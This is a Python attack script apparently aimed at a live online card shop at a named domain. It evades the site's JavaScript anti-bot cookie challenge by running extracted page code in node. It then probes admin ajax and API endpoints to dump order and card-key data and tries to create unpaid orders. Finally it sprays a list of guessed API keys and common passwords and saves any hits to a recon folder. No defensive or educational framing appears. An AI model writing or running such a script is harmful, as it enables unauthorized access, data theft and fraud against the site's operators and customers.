#!/usr/bin/env python3
"""Deep Rainbow dump probes after WAF bypass."""
import re
import json
import subprocess
import urllib.parse
import urllib.request
import http.cookiejar
from pathlib import Path

HOST = "http://xunqq.cn"
BASE = HOST + "/admin"
UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)
OUT = Path("/data/recon/pfqq.net")


def set_cookie(cj, n, v):
    cj.set_cookie(
        http.cookiejar.Cookie(
            0, n, v, None, False, "xunqq.cn", False, False, "/", False,
            False, None, False, None, None, {},
        )
    )


def session():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    def get(url, data=None, headers=None):
        h = {"User-Agent": UA, "Referer": HOST + "/nasgo/", "Accept": "*/*"}
        if headers:
            h.update(headers)
        req = urllib.request.Request(url, data=data, headers=h)
        return op.open(req, timeout=20).read().decode("utf-8", "ignore")

    get(HOST + "/nasgo/")
    get(HOST + "/loading/")
    html = get(BASE + "/")
    m = re.search(
        r"setCookie\(\s*[\"']sec_defend[\"']\s*,\s*(.+?)\)\s*;\s*setCookie\(\s*[\"']sec_defend_time[\"']",
        html,
        re.S,
    )
    if m:
        val = subprocess.run(
            ["node", "-e", f"console.log({m.group(1)})"],
            capture_output=True,
            text=True,
            timeout=15,
        ).stdout.strip()
        set_cookie(cj, "sec_defend", val)
        set_cookie(cj, "sec_defend_time", "2")
        html = get(BASE + "/index.php")
    return get, html


def main():
    get, html = session()
    print("TITLE", re.search(r"<title>([^<]+)", html).group(1))
    for pat in [
        r"ajax\.php[^\"'\s]*",
        r"api\.php[^\"'\s]*",
        r"mod=[\w]+",
        r"act=[\w]+",
        r"tid=\d+",
        r"cid=\d+",
    ]:
        ms = sorted(set(re.findall(pat, html)))
        print(pat, ms[:30], "n=", len(ms))

    print("\n=== QUERY PAGINATION ===")
    qdump = []
    for page in range(1, 8):
        for extra in [
            "",
            "&limit=50",
            "&pagesize=50",
            "&num=50",
            "&status=1",
            "&type=0",
            "&type=1",
        ]:
            url = f"{BASE}/ajax.php?act=query&page={page}{extra}"
            body = get(url, headers={"X-Requested-With": "XMLHttpRequest"})
            try:
                j = json.loads(body)
            except Exception:
                j = None
            data = j.get("data") if isinstance(j, dict) else None
            n = len(data) if isinstance(data, list) else None
            rec = {"url": url, "body": body[:500], "n": n, "j": j}
            if n or (j and (j.get("isnext") or j.get("content"))):
                print("HIT", url, body[:300])
                qdump.append(rec)
            elif page == 1 and extra == "":
                print("BASE", body[:300])
                qdump.append(rec)

    print("\n=== POST QUERY VARIANTS ===")
    variants = [
        {"act": "query", "page": "1"},
        {"act": "query", "page": "1", "limit": "100"},
        {"act": "query", "page": "1", "kw": ""},
        {"act": "query", "page": "1", "qq": ""},
        {"act": "query", "page": "1", "content": ""},
        {"act": "query", "page": "1", "status": "1"},
        {"act": "query", "page": "1", "status": "0"},
        {"act": "orders", "page": "1"},
        {"act": "getorders", "page": "1"},
        {"act": "orderlist", "page": "1"},
        {"act": "kami", "page": "1"},
        {"act": "getkami", "page": "1"},
        {"act": "cardlist", "page": "1"},
        {"act": "query", "page": "1", "data": ""},
        {"act": "query", "page": "1", "data": "1"},
    ]
    for params in variants:
        data = urllib.parse.urlencode(params).encode()
        # Rainbow query often needs GET with querystring act, POST body without act
        body = get(
            BASE + "/ajax.php",
            data=data,
            headers={
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )
        print("POST", params, body[:220])
        # also GET-style act in URL + POST body
        qs = urllib.parse.urlencode({"act": params["act"]})
        body2 = {k: v for k, v in params.items() if k != "act"}
        body = get(
            BASE + "/ajax.php?" + qs,
            data=urllib.parse.urlencode(body2).encode() if body2 else None,
            headers={
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )
        if body and "No Act" not in body:
            print("HYBRID", params, body[:220])

    print("\n=== API SEARCH ===")
    for i in [1, 2, 3, 10, 100]:
        for path in ["api.php", "%61pi.php"]:
            body = get(f"{BASE}/{path}?act=search&id={i}")
            print(path, i, body[:220])

    print("\n=== TOOLS / ORDERS API ===")
    for qs in [
        "act=tools&key=123456&limit=1",
        "act=tools&key=123456&limit=1&format=json",
        "act=tools&apikey=123456&limit=1",
        "act=orders&key=123456&limit=1",
        "act=orders&key=123456&limit=1&format=1",
        "act=orders&apikey=123456",
        "act=search&id=1&key=123456",
    ]:
        body = get(f"{BASE}/api.php?{qs}")
        print(qs, body[:220])

    print("\n=== GOODS ===")
    buy = get(BASE + "/?mod=buy")
    print("buy len", len(buy))
    (OUT / "probe" / "buy.html").write_text(buy, encoding="utf-8")
    cids = sorted(set(re.findall(r"cid[=:][\"']?(\d+)", buy)))
    print("cids", cids[:40])
    for act in [
        "getclass", "getClass", "getgoods", "getGoods", "getlist",
        "list", "getcount", "gettool", "getTool",
    ]:
        body = get(
            f"{BASE}/ajax.php?act={act}",
            headers={"X-Requested-With": "XMLHttpRequest"},
        )
        print("ACT", act, body[:300])

    fen = get(BASE + "/?mod=fenlei")
    title = (re.search(r"<title>([^<]+)", fen) or [None, "?"])[1]
    print("fenlei len", len(fen), "title", title)
    (OUT / "probe" / "fenlei.html").write_text(fen, encoding="utf-8")
    links = sorted(set(re.findall(r"\?mod=buy[^\"'\s]*", fen + buy + html)))
    print("buy links", links[:50], "n", len(links))

    # try known tid from prior recon
    for tid in ["1109", "1", "2", "10", "100"]:
        body = get(f"{BASE}/?mod=buy&tid={tid}")
        price = re.search(r"price[^0-9]{0,10}([\d.]+)", body, re.I)
        name = re.search(r"class=\"title\"[^>]*>([^<]+)", body)
        stock = re.search(r"库存[^<0-9]{0,10}(\d+)", body)
        print(
            "TID", tid, "len", len(body),
            "price", price.group(1) if price else None,
            "name", name.group(1).strip() if name else None,
            "stock", stock.group(1) if stock else None,
            "hashsalt", "hashsalt" in body,
        )
        if tid == "1109":
            (OUT / "probe" / "buy_1109.html").write_text(body, encoding="utf-8")

    # attempt unpaid order create via ajax
    print("\n=== ORDER CREATE ===")
    for payload in [
        {"act": "pay", "tid": "1109", "input1": "13800138000", "num": "1"},
        {"act": "pay", "tid": "1", "input1": "test@test.com", "num": "1"},
        {"act": "addcart", "tid": "1109", "num": "1"},
    ]:
        body = get(
            BASE + "/ajax.php?" + urllib.parse.urlencode({"act": payload["act"]}),
            data=urllib.parse.urlencode({k: v for k, v in payload.items() if k != "act"}).encode(),
            headers={
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )
        print(payload, body[:300])

    # broader tools key spray from TG/QQ hints + common
    print("\n=== TOOLS SPRAY 2 ===")
    keys = [
        "7229863", "1934131068", "985895", "vxqcc", "VXQCC", "haomaqq",
        "xunqq", "pfqq", "qqpifa", "admin888", "admin123", "888888",
        "666666", "111111", "000000", "password", "qwer1234", "abc123",
        "faka123", "faka888", "rainbow123", "ydg", "ydg123",
    ]
    hits = []
    for key in keys:
        body = get(f"{BASE}/api.php?act=tools&key={urllib.parse.quote(key)}&limit=1")
        if "错误" not in body and "空" not in body and "不正确" not in body:
            print("TOOLS HIT", key, body[:300])
            hits.append({"key": key, "body": body})
        elif "关闭" in body:
            print("TOOLS CLOSED", key, body[:200])
    print("tools hits", len(hits))

    out = {
        "query_dump_samples": qdump[:20],
        "buy_links": links[:80],
        "tools_hits": hits,
    }
    (OUT / "dump" / "DEEP.json").write_text(
        json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    print("DONE")


if __name__ == "__main__":
    main()
